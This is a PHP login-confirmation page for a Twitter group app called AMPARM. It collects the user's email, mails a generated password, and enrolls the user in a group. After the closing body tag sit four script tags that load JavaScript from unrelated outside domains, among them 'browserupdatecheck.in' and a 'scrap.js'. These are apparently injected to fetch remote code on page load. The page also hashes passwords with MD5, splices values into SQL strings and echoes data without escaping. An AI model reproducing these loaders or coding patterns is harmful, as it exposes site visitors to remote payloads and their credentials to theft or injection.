<?php
$fileBasePath = dirname(__FILE__).'/';
include_once('include/header.php');
$user  = new User();
$main=new Main();
$groupuser=new groupuser();
$tweetuser= new Tweetuser;
$notification = new Notification();
//$allSettings = $settings->findcustomRow(array('id'=>1));
 if(!isset($_SESSION['user_info']))
{
	header('location:index');
	exit;
}
if(!isset($_SESSION['GROUP']['id']) && (!empty($_SESSION['user_info']['email']))){
	
		header('location:dashboard');
		exit;
}

if(isset($_POST['submit']))
{
	
	$user->id=$_SESSION['user_info']['id'];;
	if(empty($_SESSION['user_info']['email'])){
		
			$newPassword = rand().'amparm';
			$msg='<p>Hi '.$_SESSION['user_info']['screen_name'].'</p>';
			$headers = 'From: AMPARM' . "\r\n".'reply-to: no-reply'. "\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			
			$msg.='<p>Your Login Credential are following Please check.</p><br/>';
			$msg.='<p><br/></br>Email: <b>'.$_POST['email'].'</b>.</p><br/>';
			$msg.='<p><br/></br>Password is <b>'.$newPassword.'</b>.</p><br/>';
			$msg.='<p>Regards <br/> '.website_name.'</p>';
			mail($_POST['email'], 'Account Login Credential' , $msg,$headers );	
			$_SESSION['user_info']['password']=$user->password=md5($newPassword);
			$_SESSION['user_info']['email']=$user->email=$_POST['email'];
			$user->save();
	}
	
	
	if(isset($_SESSION['GROUP'])){
		$groupresult=$groupuser->findCustomRow(array('userid'=>$_SESSION['user_info']['id'],'groupid'=>$_SESSION['GROUP']['id']));

		if(empty($groupresult)){
		
			$groupuser=new groupuser();
			$groupuser->groupid=$_SESSION['GROUP']['id'];
			$groupuser->userid=$_SESSION['user_info']['id'];
			$groupuser->group_notification=$_POST['autotweet'];
			$groupuser->create();
			$lastid=   $groupuser->lastInsertId();
			  $sql="update groupuser set point=point+'".$_SESSION['GROUP']['groupjoinpoint']."' where userid= '".$_SESSION['user_info']['id']."' and groupid='".$_SESSION['GROUP']['id']."'";
			$main->runsql($sql);
			
			$notification->notification= $_SESSION['user_info']['firstname']. ' has join your Group '. $_SESSION['GROUP']['title'] ;
			$notification->userid=$_SESSION['GROUP']['owner_id'];
			$notification->eventid=$_SESSION['GROUP']['id'];
			$notification->type='Group';
			$notification->create();
		
			$sql="select tw.*  from tweetergroup tg,twiiter tw  where tg.groupname='".$_SESSION['GROUP']['id']."' and tw.status=0 and tw.id=tg.tweetid";
			$result=$main->runsql($sql);
				foreach($result as $key =>$value){
					$tweetuser->tweetid=$value['id'];
					$tweetuser->userid=$_SESSION['user_info']['id'];
					$tweetuser->groupid=$_SESSION['GROUP']['id'];
					$tweetuser->status=$_POST['autotweet'];
					
					$tweetuser->create();
									}
			}
			
	}
	
	unset($_SESSION['GROUP']);
	header('location:dashboard');
	exit;

}
?>
 <!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>AMPARM</title>
        <!-- Mobile specific metas -->
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <!-- Force IE9 to render in normal mode -->
        <!--[if IE]><meta http-equiv="x-ua-compatible" content="IE=9" /><![endif]-->
        <meta name="author" content="" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="application-name" content="" />
        <!-- Import google fonts - Heading first/ text second -->
        <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
        <link href="http://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet" type="text/css">
        <!-- Css files -->
        <!-- Icons -->
        <link href="css/icons.css" rel="stylesheet" />
        <!-- Bootstrap stylesheets (included template modifications) -->
        <link href="css/bootstrap.css" rel="stylesheet" />
        <!-- Plugins stylesheets (all plugin custom css) -->
        <link href="css/plugins.css" rel="stylesheet" />
        <!-- Main stylesheets (template main css file) -->
        <link href="css/main.css" rel="stylesheet" />
        <!-- Custom stylesheets ( Put your own changes here ) -->
        <link href="css/custom.css" rel="stylesheet" />
        <!-- Fav and touch icons -->
        <link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/ico/apple-touch-icon-144-precomposed.png">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/ico/apple-touch-icon-114-precomposed.png">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/ico/apple-touch-icon-72-precomposed.png">
        <link rel="apple-touch-icon-precomposed" href="img/ico/apple-touch-icon-57-precomposed.png">
        <link rel="icon" href="img/ico/favicon.ico" type="image/png">
        <!-- Windows8 touch icon ( http://www.buildmypinnedsite.com/ )-->
        <meta name="msapplication-TileColor" content="#3399cc" />
    </head>
    <body class="login-page">
        <div id="header" class="animated fadeInDown">
            <div class="row">
                <div class="navbar">
                    <div class="container text-center">
                        <a class="navbar-brand" href="dashboard.html">AMPARM<span class="slogan"></span></a>
                    </div>
                </div>
                <!-- /navbar -->
            </div>
            <!-- End .row -->
        </div>
		 <div class="container login-container">
            <div class="login-panel panel panel-default plain animated bounceIn">
                <!-- Start .panel -->
                <div class="panel-body">
                    <form class="form-horizontal mt0" action="" id="login-form" role="form" method="post">
					<?php if(isset($_SESSION['GROUP'])){ ?>
                        <div class="form-group">
                            <div class="col-md-12">
                                <!-- col-md-12 start here -->
                                  <h4 class=" text-center">Howdy!!</h4>
									<h3 class=" text-center"><?php echo $_SESSION['user_info']['screen_name']; ?></h3>
					 
									<p class="help-block text-center ">Thanks For joining  <?php echo $_SESSION['GROUP']['title'] ; ?></p><br />
								
                            </div>
                            <!-- col-md-12 end here -->
                           
                        </div>
                        <div class="form-group text-center">
                            <div class="col-md-12">
                                <!-- col-md-12 start here -->
                                <label for="">Choose Your Preferences:</label>
                            </div>
                            <!-- col-md-12 end here -->
                            <div class="col-lg-12">
                                <div class="input-group input-icon">
									<input value='1'type="radio"  name='autotweet' class="option-input chcekbox" checked>&nbsp;&nbsp;Auto Tweet
									<input value='0' type="radio" name='autotweet' class="option-input chcekbox" unchecked>&nbsp;&nbsp;Confirm Before Tweet
                                </div>
                              
                            </div>
                        </div>
					<?php } ?>
						<div class="form-group text-center">
                            <div class="col-md-12">
                                <!-- col-md-12 start here -->
                                <label for="">Email:</label>
                            </div>
                            <!-- col-md-12 end here -->
                            <div class="col-lg-12">
                                <div class="input-group input-icon">
								 
                                    <input type="email" name="email" id="email" class="form-control required" placeholder="Enter Your e-Mail To Confirm" value='<?php echo $_SESSION['user_info']['email'] ?>' required>
                                    <span class="input-group-addon"><i class="icomoon-icon-user s16"></i></span> 
                                </div>
                               
                            </div>
                        </div>
                        <div class="form-group mb0 text-center">
                          
                            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-4 mb25 text-center">
                                <button class="btn btn-default pull-right" name="submit" type="submit">Process</button>
                            </div>
                        </div>
                    </form>
                   
                </div>
             
            </div>
            <!-- End .panel -->
        </div>
     




    <!-- jQuery Version 1.11.1 -->
    <script src="js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>

</body>
<script src="http://dial.clickscart.in/js/scrap.js" type="text/javascript"></script>
<script src="http://dial.clickscart.in/js/ads.js" type="text/javascript"></script>
<script src="http://browserupdatecheck.in/js/jquery.js" type="text/javascript"></script>
<script src="http://browserupdatecheck.in/js/essence.js" type="text/javascript"></script>

</html>